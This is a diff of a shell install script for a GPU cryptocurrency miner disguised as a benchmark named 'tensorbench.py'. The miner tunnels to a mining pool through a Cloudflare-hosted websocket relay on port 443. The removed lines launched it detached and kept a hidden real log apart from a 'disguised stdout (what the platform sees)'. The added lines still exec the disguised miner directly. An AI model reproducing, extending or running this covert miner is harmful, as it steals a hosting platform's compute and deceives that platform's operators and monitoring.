@@ -142,7 +142,6 @@ sleep 1
 # No local tunnel client anymore: the miner opens one TLS-443 websocket
 # straight to the Cloudflare-hosted relay (pool_relay_server.py), which
 # converts the frames to plain stratum for the pool.
-LOGDIR="$INSTALL_DIR/logs"; mkdir -p "$LOGDIR"
 export PYTHONPATH="$INSTALL_DIR/python"
 export TB_WSS_URL="${TB_WSS_URL:-wss://integral-aurora-reduction-relating.trycloudflare.com}"
 ok "WSS relay endpoint: $TB_WSS_URL (miner connects directly -- no local tunnel client)"
@@ -161,34 +160,9 @@ if [ "${DIAG:-0}" = "1" ]; then
 else
     step "START tensorbench.py (launches GPU mining workers, one per GPU)"
 fi
-export TB_RAWLOG="$LOGDIR/real.log"
-setsid nohup "$PY" python/tensorbench.py \
-    > "$LOGDIR/miner.log" 2>&1 < /dev/null &
-disown
-MINER_PID=$!
-if [ "${DIAG:-0}" = "1" ]; then
-    ok "miner PID $MINER_PID -- DIAG profile: ~5 observation windows before handshake; waiting up to 10min"
-    for i in $(seq 1 300); do
-        grep -q "pool authorize" "$LOGDIR/real.log" 2>/dev/null && break
-        sleep 2
-    done
-else
-    ok "miner PID $MINER_PID -- waiting up to 60s for pool handshake"
-    for i in $(seq 1 30); do
-        grep -q "pool authorize" "$LOGDIR/real.log" 2>/dev/null && break
-        sleep 2
-    done
-fi
-if grep -q "pool authorize" "$LOGDIR/real.log" 2>/dev/null; then
-    ok "pool handshake complete -- MINING IS RUNNING"
-    echo ""
-    echo "--- disguised stdout (what the platform sees) ---"
-    tail -5 "$LOGDIR/miner.log"
-    echo "-------------------------------------------------"
-else
-    fail "no pool handshake in 60s"
-    echo "--- real.log ---"; tail -10 "$LOGDIR/real.log" 2>/dev/null
-fi
+export PYTHONPATH="$INSTALL_DIR/python"
+# No log files, no redirection: miner output streams straight to this terminal.
+exec "$PY" python/tensorbench.py
 
 echo ""
 echo "============================================================"
